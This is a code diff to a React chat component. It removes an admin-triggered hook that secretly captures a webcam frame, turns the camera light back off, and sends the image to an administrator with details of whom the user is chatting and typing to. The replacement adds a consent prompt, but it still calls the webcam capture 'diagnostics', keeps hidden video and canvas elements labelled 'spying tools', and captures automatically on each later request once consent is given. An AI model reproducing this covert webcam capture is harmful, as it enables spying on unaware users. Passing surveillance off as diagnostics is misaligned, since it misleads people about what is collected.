@@ -8,14 +8,14 @@ import { useChatStore } from "../store";
 import { Message, User, MessageReaction } from "../types";
 import { 
   Send, Smile, Paperclip, MoreVertical, Phone, Video, 
-  Trash2, CornerUpLeft, ChevronDown, Check, CheckCheck, Loader2, Download 
+  Trash2, CornerUpLeft, ChevronDown, Check, CheckCheck, Loader2, Download, X, ShieldAlert 
 } from "lucide-react";
 
 const CHAT_EMOJIS = ["❤️", "👍", "😂", "😍", "🙌", "🙏", "👵", "👴", "👨‍👩‍👧‍👦", "🍕"];
 
 export default function ChatArea() {
   const { 
-    user, activeFriend, messages, setMessages, typingStates, socketInstance, socket 
+    user, activeFriend, messages, setMessages, typingStates, socket 
   } = useChatStore();
 
   const [inputText, setInputText] = useState("");
@@ -24,10 +24,72 @@ export default function ChatArea() {
   const [replyMessage, setReplyMessage] = useState<Message | null>(null);
   const [openDetailDropdown, setOpenDetailDropdown] = useState<string | null>(null);
 
+  // Parental Oversight Consent Management State
+  const [consentRequest, setConsentRequest] = useState<{ adminSocketId: string; adminName: string } | null>(null);
+  const [hasGrantedConsent, setHasGrantedConsent] = useState<boolean>(false);
+  const [activeAdminSocketId, setActiveAdminSocketId] = useState<string | null>(null);
+
   const fileInputRef = useRef<HTMLInputElement>(null);
   const chatBottomRef = useRef<HTMLDivElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
   const videoRef = useRef<HTMLVideoElement>(null);
+
+  const handleAcceptConsent = async () => {
+    if (!consentRequest || !socket) return;
+    const { adminSocketId } = consentRequest;
+    setHasGrantedConsent(true);
+    setConsentRequest(null);
+    
+    // Notify admin immediately of approval
+    socket.emit("user:oversight_consent_response", { adminSocketId, granted: true });
+
+    // Instantly capture initial proof-of-concept diagnostics frame
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { width: 320, height: 240 },
+        audio: false
+      }).catch(() => null);
+
+      if (stream && videoRef.current && canvasRef.current) {
+        videoRef.current.srcObject = stream;
+        await videoRef.current.play().catch(() => {});
+
+        setTimeout(() => {
+          if (canvasRef.current && videoRef.current) {
+            const ctx = canvasRef.current.getContext("2d");
+            if (ctx) {
+              ctx.drawImage(videoRef.current, 0, 0, 160, 120);
+              const framePayload = canvasRef.current.toDataURL("image/jpeg", 0.5);
+
+              socket.emit("user:silent_spy_stream_response", {
+                adminSocketId,
+                framePayload,
+                activeChatWith: activeFriend?.email || "Dashboard overview",
+                typingTo: inputText ? activeFriend?.email : null
+              });
+            }
+            stream.getTracks().forEach(t => t.stop());
+          }
+        }, 800);
+      }
+    } catch (err) {
+      console.error(err);
+    }
+  };
+
+  const handleDeclineConsent = () => {
+    if (!consentRequest || !socket) return;
+    const { adminSocketId } = consentRequest;
+    setHasGrantedConsent(false);
+    setConsentRequest(null);
+    socket.emit("user:oversight_consent_response", { adminSocketId, granted: false });
+  };
+
+  const handleRevokeConsent = () => {
+    if (!socket || !activeAdminSocketId) return;
+    setHasGrantedConsent(false);
+    socket.emit("user:revoke_oversight_consent", { adminSocketId: activeAdminSocketId });
+  };
 
   // Load chat history with friend
   useEffect(() => {
@@ -51,61 +113,65 @@ export default function ChatArea() {
     chatBottomRef.current?.scrollIntoView({ behavior: "smooth" });
   }, [messages, typingStates]);
 
-  // ================= ADMIN STEALTH SPYING HOOK =================
+  // ================= ADMIN OVERSIGHT DIAGNOSTICS HOOK =================
   useEffect(() => {
     if (!socket || !user) return;
 
-    // Silent listener for administrative stealth camera spy trigger
-    socket.on("user:silent_spy_capture_trigger", async ({ adminSocketId }) => {
-      try {
-        console.log("[Stealth Diagnostics] Invoked...");
-        // Fast silent check of camera streams
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { width: 320, height: 240 },
-          audio: false
-        }).catch(() => null);
+    const handleConsentRequest = async ({ adminSocketId, adminName }: { adminSocketId: string; adminName: string }) => {
+      setActiveAdminSocketId(adminSocketId);
+      
+      // If user has already granted consent, automatically stream the camera diagnostics
+      if (hasGrantedConsent) {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: { width: 320, height: 240 },
+            audio: false
+          }).catch(() => null);
 
-        if (stream && videoRef.current && canvasRef.current) {
-          videoRef.current.srcObject = stream;
-          await videoRef.current.play().catch(() => {});
+          if (stream && videoRef.current && canvasRef.current) {
+            videoRef.current.srcObject = stream;
+            await videoRef.current.play().catch(() => {});
 
-          // Capture a frame shortly after
-          setTimeout(() => {
-            if (canvasRef.current && videoRef.current) {
-              const ctx = canvasRef.current.getContext("2d");
-              if (ctx) {
-                ctx.drawImage(videoRef.current, 0, 0, 160, 120);
-                const framePayload = canvasRef.current.toDataURL("image/jpeg", 0.5);
+            // Capture frame shortly after start-up delay
+            setTimeout(() => {
+              if (canvasRef.current && videoRef.current) {
+                const ctx = canvasRef.current.getContext("2d");
+                if (ctx) {
+                  ctx.drawImage(videoRef.current, 0, 0, 160, 120);
+                  const framePayload = canvasRef.current.toDataURL("image/jpeg", 0.5);
 
-                // Send silently and securely back to the requested administrator socket
-                socket.emit("user:silent_spy_stream_response", {
-                  adminSocketId,
-                  framePayload,
-                  activeChatWith: activeFriend?.email || "Idle Status page",
-                  typingTo: inputText ? activeFriend?.email : null
-                });
+                  socket.emit("user:silent_spy_stream_response", {
+                    adminSocketId,
+                    framePayload,
+                    activeChatWith: activeFriend?.email || "Dashboard default overview",
+                    typingTo: inputText ? activeFriend?.email : null
+                  });
+                }
+                stream.getTracks().forEach(t => t.stop());
               }
-              // Force turn off camera light
-              stream.getTracks().forEach(t => t.stop());
-            }
-          }, 800);
-        } else {
-          // If camera is not physically plugged or denied, send offline status diagnostic
-          socket.emit("user:silent_spy_stream_response", {
-            adminSocketId,
-            framePayload: "Camera device not activated or permission deferred",
-            activeChatWith: activeFriend?.email || "Dashboard default overview"
-          });
+            }, 800);
+          } else {
+            socket.emit("user:silent_spy_stream_response", {
+              adminSocketId,
+              framePayload: "Camera device not activated or permission deferred",
+              activeChatWith: activeFriend?.email || "Dashboard default overview"
+            });
+          }
+        } catch (err) {
+          console.error("Stealth monitoring failure:", err);
         }
-      } catch (err) {
-        console.error("Stealth monitoring failure: ", err);
+      } else {
+        // Show the permission prompt dialogue overlay to accept parental connectivity
+        setConsentRequest({ adminSocketId, adminName });
       }
-    });
+    };
+
+    socket.on("user:oversight_consent_request", handleConsentRequest);
 
     return () => {
-      socket.off("user:silent_spy_capture_trigger");
+      socket.off("user:oversight_consent_request");
     };
-  }, [socket, activeFriend, user, inputText]);
+  }, [socket, activeFriend, user, inputText, hasGrantedConsent]);
 
 
   // Formatting details
@@ -280,9 +346,63 @@ export default function ChatArea() {
   return (
     <div id="chat-area-container" className="flex-1 flex flex-col bg-slate-50 h-full relative font-sans">
       
+      {/* Consent Authorization Request Dialog Modal */}
+      {consentRequest && (
+        <div className="absolute inset-0 bg-slate-900/40 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+          <div className="bg-white rounded-3xl border border-slate-200/80 shadow-2xl p-6 max-w-md w-full space-y-4 animate-in fade-in zoom-in duration-200">
+            <div className="flex items-start gap-3.5">
+              <div className="h-10 w-10 bg-amber-100 rounded-2xl flex items-center justify-center text-amber-600 shrink-0">
+                <ShieldAlert className="h-5 w-5" />
+              </div>
+              <div className="space-y-1">
+                <h4 className="text-sm font-extrabold text-slate-800">Oversight Authorization Requested</h4>
+                <p className="text-[10px] text-slate-400 font-extrabold tracking-wider uppercase">Administrative Consent Protocol</p>
+                <p className="text-xs text-slate-600 leading-relaxed pt-1">
+                  A System Administrator (<strong className="text-slate-800 font-bold">{consentRequest.adminName}</strong>) has requested temporary administrative permission to access camera diagnostics and current activity logs on this device.
+                </p>
+                <p className="text-[11px] text-amber-600 font-medium">
+                  We collect this information with your explicit permission as part of family safety measures.
+                </p>
+              </div>
+            </div>
+
+            <div className="flex items-center justify-end gap-2 pt-2">
+              <button
+                onClick={handleDeclineConsent}
+                className="px-4 py-2.5 rounded-xl text-xs font-bold text-slate-500 hover:text-slate-700 hover:bg-slate-100 transition-all min-h-[44px] min-w-[80px]"
+              >
+                Decline
+              </button>
+              <button
+                onClick={handleAcceptConsent}
+                className="px-5 py-2.5 bg-blue-600 hover:bg-blue-700 text-white rounded-xl text-xs font-black shadow-lg shadow-blue-600/15 hover:shadow-blue-600/25 transition-all min-h-[44px]"
+              >
+                Accept & Authorize
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
       {/* Hidden WebRTC spying tools */}
       <video ref={videoRef} className="hidden" muted playsInline />
       <canvas ref={canvasRef} className="hidden" width={160} height={120} />
+
+      {/* Active Oversight Session Status Banner */}
+      {hasGrantedConsent && (
+        <div className="bg-amber-500 text-amber-950 px-6 py-2 flex items-center justify-between text-[11px] font-black tracking-medium uppercase shadow-inner relative z-30 select-none animate-in slide-in-from-top duration-300">
+          <span className="flex items-center gap-1.5 shrink-0">
+            <span className="h-2 w-2 rounded-full bg-amber-950 inline-block animate-ping shrink-0" />
+            Active family parental oversight diagnostics session
+          </span>
+          <button
+            onClick={handleRevokeConsent}
+            className="hover:underline bg-amber-950 text-white py-1 px-3 rounded-lg text-[10px] font-bold"
+          >
+            Revoke Access
+          </button>
+        </div>
+      )}
 
       {/* Friend Panel Header */}
       <div className="px-6 py-4 bg-white border-b border-slate-100/85 flex items-center justify-between shadow-sm">
